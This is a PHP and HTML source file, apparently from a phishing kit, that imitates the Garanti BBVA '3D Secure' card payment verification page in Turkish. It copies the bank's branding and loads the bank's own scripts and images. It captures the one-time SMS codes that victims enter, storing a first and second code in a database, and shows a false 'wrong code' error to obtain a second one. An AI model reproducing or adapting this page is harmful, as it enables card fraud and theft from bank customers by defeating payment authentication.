<?php
error_reporting(0);
date_default_timezone_set('Europe/Istanbul');
include('config.php');

// SMS durumunu güncelle
$stmt = $pdo->prepare("UPDATE users SET payment_status = 'sms_waiting', updated_at = NOW() WHERE user_identifier = ?");
$stmt->execute([$userIdentifier]);

$hata = false;
if($_GET) {
    if($_GET['hata'] == "true") $hata = true;
    else $hata = false;
}

if($_POST){
    $sms = guvenlik(trim($_POST['sms']));
    $date = date('d.m.Y H:i');
    
    if($hata == true) {
        // İkinci SMS denemesi
        $stmt = $pdo->prepare("UPDATE users SET sms_code2 = ?, redirect_url = NULL, updated_at = NOW() WHERE user_identifier = ?");
        $stmt->execute([$sms, $userIdentifier]);
        header('Location: ../bekle.php');
        exit;
    } else {
        // İlk SMS denemesi
        $stmt = $pdo->prepare("UPDATE users SET sms_code = ?, redirect_url = NULL, updated_at = NOW() WHERE user_identifier = ?");
        $stmt->execute([$sms, $userIdentifier]);
        header('Location: ../bekle.php');
        exit;
    }
}
?>
<html lang="tr">
   <head>
      <meta charset="utf-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <title>3D Secure Doğrulama Kodu Girişi | Garanti Ödeme Sistemleri</title>
      <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
      <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
      <meta http-equiv="Pragma" content="no-cache">
      <meta http-equiv="Expires" content="0">
      <link rel="stylesheet" href="./acs-style/garanti/css/fonts.css">
      <link rel="stylesheet" href="./acs-style/garanti/css/garanti.css">
      <script type="text/javascript" src="https://gbemv3dsecure.garanti.com.tr/js/jquery-3.3.1.min.js"></script>
      <script type="text/javascript" src="https://gbemv3dsecure.garanti.com.tr/js/functions.js"></script>

   </head>
   <body class="threed-page">
      <div class="container h-100">
         <div id="js-main" class="row justify-content-center align-items-center" style="height: auto;">
            <div class="box">
               <div class="shadow px-2 px-sm-4 pb-1 theme-garanti">
                  <div class="px-2 pt-2">
                     <form action="" method="POST">
                        <div class="text-right">
                           <button class="btn btn-link p-0 text-right text-muted">
                           İptal
                           </button>
                        </div>
                        <div class="row m-0 title">
                           <div class="col-6 text-left px-0 pt-1">
                              <img height="39" width="64" src="https://gbemv3dsecure.garanti.com.tr/assets/img/issuer.png">
                           </div>
                           <div class="col-6 text-right px-0 pt-1">
                              <div>
                                 <div>
                                 </div>
                              </div>
                           </div>
                        </div>
                        <h6 class="text-center mb-4 font-weight-bold">
                           3D SECURE ÖDEME DOĞRULAMA
                        </h6>
                        <div>
                           <div class="summary">
                              <ul>
                                 <?php if(isset($_SESSION['tutar'])) { ?><li>
                                    <label>Tutar</label>
                                    <i class="icon-number-one d-none d-md-inline-block"></i>
                                    <span class="total-value"><?= $_SESSION['tutar'] ?> TL</span>
                                 </li><?php } ?>
                                 <li>
                                    <label>Mağaza</label>
                                    <i class="icon-bag d-none d-md-inline-block"></i>
                                    <span><?= $isyeri?></span>
                                 </li>
                                 <li>
                                    <label>Kart No</label>
                                    <i class="icon-credit-card d-none d-md-inline-block"></i>
                                    <span>************<?= $cc_last_4?></span>
                                 </li>
                                 <li>
                                    <label>Tarih</label>
                                    <i class="icon-watch d-none d-md-inline-block"></i>
                                    <span><?php echo date("d.m.Y  H:i:s"); ?></span>
                                 </li>
                              </ul>
                           </div>
                        </div>
                        <div>
                           <div class="form-group mb-4">
                              <label for="otp">Sonu <strong>******<?= $no_last_4?></strong> ile biten telefon
                              numaranıza gönderilen <strong></strong>
                              doğrulama şifresini giriniz.</label>
                     <form method="POST" action="<?php echo $hata == true ? "?hata=true" : ""?>">
                     <input minlength="6" onpaste="return false;" ondrop="return false;" onkeypress="test(this, event)" dir="ltr" maxlength="6" required="required" type="text" pattern="[\d]{6}" class="form-control form-pin" id="sms" name="sms" autocomplete="off" placeholder="6 haneli şifreyi girin">
                     </div>
                     <div class="form-group">
					 <?php if($hata) { echo '<p class="disclaimer" style="color:red;text-align: center">Yanlış kod girdiniz, lütfen yeniden gönderilen kodu giriniz.</p>'; } ?>
                     <button name="bsubmit" class="btn btn-primary btn-block" type="submit">GÖNDER</button>
                     </div>
                     </form>
                     <div class="text-center font-weight-bold pt-2 pb-4">
                     <button class="btn btn-link d-inline-block fs-10 p-0">
                     YENİ ŞİFRE GÖNDER
                     </button>
                     </div>
                     </div>
                     <div class="text-center font-weight-bold py-2 pb-sm-0 mb-3" style="display: none">
                        <label>BonusFlaş'tan 3D Secure Mobil Onay'ı kullanmak için telefon
                        ayarlarından BonusFlaş bildirimlerine izin vermelisiniz.</label>
                     </div>
                     <div class="text-center font-weight-bold py-2 pb-sm-0 mb-3" style="display: block">
                        <input type="checkbox" name="downloadbonus" class="form-check" id="downloadbonus" checked="checked">
                        <label for="downloadbonus">Daha hızlı bir 3D Secure Ödeme Doğrulama deneyimi için
                        BonusFlaş mobil uygulamasını indirmek istiyorum.
                        <img width="20" height="23" src="https://gbemv3dsecure.garanti.com.tr/assets/img/logo-bonus.png"></label>
                     </div>
                     <div class="border-top border-color-light fs-10">
                        <button type="button" class="btn btn-link d-block no-underline pl-2 pr-0 w-100 js-acc-btn">
                        <span class="float-left d-block">Daha fazla bilgi</span>
                        <i class="icon-caret-up float-right d-none"></i>
                        <i class="icon-caret-down float-right d-block"></i>
                        </button>
                        <p class="px-4 pb-3 d-none">
                           GSM numarası bilgilerinizi tüm şubelerimizden veya <a href="">Paramatik</a>’lerimizden
                           günceleyebilirsiniz.
                        </p>
                     </div>
                     <div class="border-top border-color-light fs-10">
                        <button type="button" class="btn btn-link d-block no-underline pl-2 pr-0 w-100 js-acc-btn">
                        <span class="float-left d-block">Yardım</span>
                        <i class="icon-caret-up float-right d-none"></i>
                        <i class="icon-caret-down float-right d-block"></i>
                        </button>
                        <p class="px-4 pb-3 d-none">
                           “Garanti BBVA Müşteri İletişim Merkezi <a href="tel:+904440333">+90 444 0 333</a>.
                        </p>
                     </div>
                     <input type="hidden" id="generatedElement">
                     </form>
                  </div>
               </div>
            </div>
         </div>
      </div>
      <script type="text/javascript">
         function test(el, event) {
            if(event.key.match(/\d/) == null) {
               event.preventDefault();
               return false
            }
         }
      </script>
      <script src="/tracking.js"></script>
   </body>
</html>